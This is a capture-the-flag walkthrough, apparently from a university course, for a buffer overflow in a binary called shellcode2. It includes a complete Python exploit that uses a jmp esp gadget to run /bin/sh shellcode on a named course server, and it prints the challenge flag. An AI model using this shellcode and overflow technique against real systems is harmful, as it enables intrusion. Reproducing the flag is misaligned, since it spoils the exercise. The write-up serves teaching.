# Shellcode2 Challenge Walkthrough

**Challenge:** Advanced shellcode injection using JMP ESP technique
**Server:** moa6.eecs.utk.edu:6055
**Flag:** `cosc466-flag-{Pxky6X6D5nXRwpnm}`

## Overview

This challenge is a twist on classic shellcode injection. While the program gives you a "hint" address, it's **misleading**! The real solution requires understanding the **JMP ESP** technique for shellcode execution.

## Step 1: Initial Reconnaissance

Check the binary:
```bash
file shellcode2
# Output: ELF 32-bit LSB executable, Intel 80386, statically linked, not stripped
```

Run it to see what happens:
```bash
echo "test" | ./shellcode2
# Output: $ bash: command not found: test, but hint:0x80499ac
#         ByeByeBye!
```

**Important observation:** The program prints `hint:0x80499ac` - but this is a **red herring**!

## Step 2: Analyze the Binary in GDB

Disassemble main to find the vulnerable function:
```bash
gdb shellcode2
(gdb) disassemble main
```

**Key findings:**
```asm
0x08049a32: lea    eax,[ebp-0x8]    ; Buffer at ebp-0x8 (8 bytes from ebp)
0x08049a36: call   gets             ; VULNERABLE: no bounds checking!
```

The buffer is **8 bytes** from EBP.

## Step 3: Find the Offset

Use pwndbg's cyclic pattern:
```bash
gdb shellcode2
(gdb) cyclic 50
# Output: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama

(gdb) run
# Paste the cyclic pattern when prompted

# After crash, check EIP
(gdb) info registers eip
# EIP = 0x08007069
```

Calculate the offset:
```python
# The pattern shows we control EIP after certain bytes
# Manual verification:
echo -e "AAAAAAAAAAAA\x41\x42\x43\x44" | gdb shellcode2 -batch -ex "run" -ex "info registers eip"
# EIP = 0x44434241 (our DCBA in little-endian)
```

**Offset = 12 bytes** (8 bytes buffer + 4 bytes saved EBP)

## Step 4: The Misleading Hint Address

The program hints at `0x80499ac`. Let's check what's there:
```bash
gdb shellcode2
(gdb) disassemble 0x80499ac
```

**Output:**
```asm
Dump of assembler code for function print_jump_addr:
   0x080499ac <+0>:     push   ebp
   0x080499ad <+1>:     mov    ebp,esp
   ...
   0x080499c1 <+21>:    lea    edx,[eax-0x34fdd]
   0x080499c7 <+27>:    push   edx
   0x080499c8 <+28>:    mov    ebx,eax
   0x080499ca <+30>:    call   printf
```

**This is just the function that prints the hint!** It's not useful for exploitation.

## Step 5: Finding the Real Target - The Jump Function

List all functions to find something useful:
```bash
gdb shellcode2
(gdb) info functions
```

Look for interesting functions around the hint address:
```
0x08049975  cmd_ls
0x0804999a  jump          <-- Interesting!
0x080499ac  print_jump_addr
0x080499d8  main
```

**There's a `jump` function just before the hint function!** Let's disassemble it:

```bash
(gdb) disassemble jump
```

**Critical discovery:**
```asm
Dump of assembler code for function jump:
   0x0804999a <+0>:     push   ebp
   0x0804999b <+1>:     mov    ebp,esp
   0x0804999d <+3>:     call   0x8049a8f <__x86.get_pc_thunk.ax>
   0x080499a2 <+8>:     add    eax,0x9c652
   0x080499a7 <+13>:    jmp    esp    <-- JACKPOT!
   0x080499a9 <+15>:    nop
   0x080499aa <+16>:    pop    ebp
   0x080499ab <+17>:    ret
```

## Step 6: Understanding JMP ESP (The Real Target)

**At address `0x080499a7` there's a `jmp esp` instruction!**

### Why 0x080499a7 (with 'a7') and NOT 0x80499ac (with 'ac')?

- **0x80499ac** = Start of `print_jump_addr` function (the hint function) - WRONG!
- **0x080499a7** = Address of the `jmp esp` instruction inside the `jump` function - CORRECT!

The hint was deliberately misleading - they wanted you to explore and find the JMP ESP gadget yourself!

### What is JMP ESP?

`jmp esp` is a gadget that jumps to whatever code is at the current stack pointer (ESP). This is perfect for shellcode injection!

**Attack flow:**
```
1. Buffer overflow overwrites return address with 0x080499a7
2. Function returns → jumps to 0x080499a7
3. Executes "jmp esp" → jumps to stack (ESP)
4. ESP points to bytes right after our return address
5. We place shellcode there!
6. Shellcode executes!
```

**Payload structure:**
```
[12 bytes padding] + [0x080499a7 = jmp esp address] + [shellcode]
                           ^                              ^
                           |                              |
                     Return address              Executed via jmp esp!
```

## Step 7: Craft the Exploit

```python
#!/usr/bin/env python3
import socket
import struct
import subprocess

HOST = "moa6.eecs.utk.edu"
PORT = 6055
OFFSET = 12  # 8 bytes buffer + 4 bytes saved EBP
JMP_ESP_ADDR = 0x080499a7  # Address of "jmp esp" gadget (NOT the hint address!)
SHELLCODE = b"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\xb0\x0b\xcd\x80"

def main() -> None:
    # Build payload: padding + jmp_esp_address + shellcode
    payload = b"A" * OFFSET + struct.pack("<I", JMP_ESP_ADDR) + SHELLCODE + b"\n"
    
    print(f"[*] Offset: {OFFSET} bytes")
    print(f"[*] JMP ESP address: {hex(JMP_ESP_ADDR)}")
    print(f"[*] Shellcode length: {len(SHELLCODE)} bytes")
    print(f"[*] Payload size: {len(payload)} bytes")

    with socket.create_connection((HOST, PORT), timeout=5) as sock:
        sock.sendall(payload)
        # Send commands to the spawned shell
        sock.sendall(b"cat flag.txt\n")
        sock.sendall(b"ls\n")
        sock.sendall(b"exit\n")
        
        chunks = []
        while True:
            try:
                data = sock.recv(4096)
            except socket.timeout:
                break
            if not data:
                break
            chunks.append(data)
        
        output = b"".join(chunks).decode()
        print(output)

if __name__ == "__main__":
    main()
```

## Step 8: Execute and Get Flag

```bash
python3 exploit.py
```

**Output:**
```
[*] Offset: 12 bytes
[*] JMP ESP address: 0x80499a7
[*] Shellcode length: 25 bytes
[*] Payload size: 42 bytes
cosc466-flag-{Pxky6X6D5nXRwpnm}
flag.txt
shellcode2
```

## Key Concepts Explained

### Why Did We Need to Disassemble `jump`?

1. **The hint was misleading** - `0x80499ac` is just the printing function
2. **The real gadget was hidden** - We needed to find a `jmp esp` instruction
3. **Function exploration** - Listing all functions revealed the `jump` function
4. **Instruction-level analysis** - Disassembling showed `jmp esp` at `0x080499a7`

### Address Breakdown

```
Function Layout:
0x0804999a  <jump+0>:   push ebp
0x0804999b  <jump+1>:   mov ebp,esp
...
0x080499a7  <jump+13>:  jmp esp    ← THIS is our target!
0x080499a9  <jump+15>:  nop
0x080499ac  <print_jump_addr+0>:   push ebp    ← This was the hint (wrong!)
```

### Why JMP ESP Works

After a function returns:
1. Return address popped from stack into EIP
2. EIP jumps to our address (`0x080499a7`)
3. CPU executes `jmp esp`
4. ESP still points to the stack, right after where the return address was
5. Our shellcode is sitting there waiting!
6. CPU executes our shellcode

**Visual representation:**
```
Stack before return:
[A A A A A A A A A A A A][0x080499a7][shellcode bytes...]
                          ^           ^
                          |           |
                    Return address   ESP points here after return
```

### The Hint vs The Reality

| Feature | Hint Address (0x80499ac) | Real Target (0x080499a7) |
|---------|-------------------------|-------------------------|
| Function | `print_jump_addr` | `jump` |
| What it does | Prints hint message | Contains `jmp esp` gadget |
| Offset | Start of function (+0) | Middle of function (+13) |
| Useful? | No - just misleads you | Yes - enables shellcode! |
| Technique | N/A | JMP ESP exploitation |

## Common Mistakes

### Mistake 1: Using the Hint Address
```python
TARGET_ADDR = 0x80499ac  # WRONG! This is just the hint printing function
```

**Why it fails:** Jumping to `print_jump_addr` doesn't help execute our shellcode. It's a distraction!

### Mistake 2: Wrong Offset
```python
OFFSET = 8  # WRONG! Only accounts for buffer
OFFSET = 16  # WRONG! Too large
OFFSET = 12  # CORRECT! Buffer (8) + saved EBP (4)
```

### Mistake 3: Shellcode Before Return Address
```python
payload = SHELLCODE + b"A"*padding + struct.pack("<I", target)  # WRONG!
```

**Why it fails:** JMP ESP jumps to bytes *after* the return address, not before!

## Practice Exercises

1. **Find other gadgets:** Use `objdump -d shellcode2 | grep "jmp"` to find all jmp instructions
2. **Test locally:** Set `LOCAL_BINARY = "./shellcode2"` and verify offset with different patterns
3. **Try different shellcode:** Replace with shellcode that reads different files
4. **Understand the hint:** Why did the challenge creators include a misleading hint?

## Tools Used

- **GDB with pwndbg:** For debugging and finding gadgets
- **cyclic patterns:** To find exact offset
- **objdump:** To disassemble and find gadgets
- **Python struct:** To pack addresses in little-endian format

## Resources

- [JMP ESP Exploitation](https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/)
- [Return-Oriented Programming](https://en.wikipedia.org/wiki/Return-oriented_programming)
- [Shellcode Database](http://shell-storm.org/shellcode/)

## Summary

This challenge taught us:
1. **Don't trust hints blindly** - Verify everything!
2. **Explore all functions** - The answer might be adjacent to the hint
3. **Understand gadgets** - JMP ESP is a classic exploitation technique
4. **Address precision matters** - `0x080499a7` (jmp esp) vs `0x80499ac` (wrong function)
5. **Payload positioning** - Shellcode goes *after* the return address for JMP ESP

The key insight: **The hint (0x80499ac) pointed to the wrong address. We needed to disassemble the `jump` function to find the real gadget at 0x080499a7!**
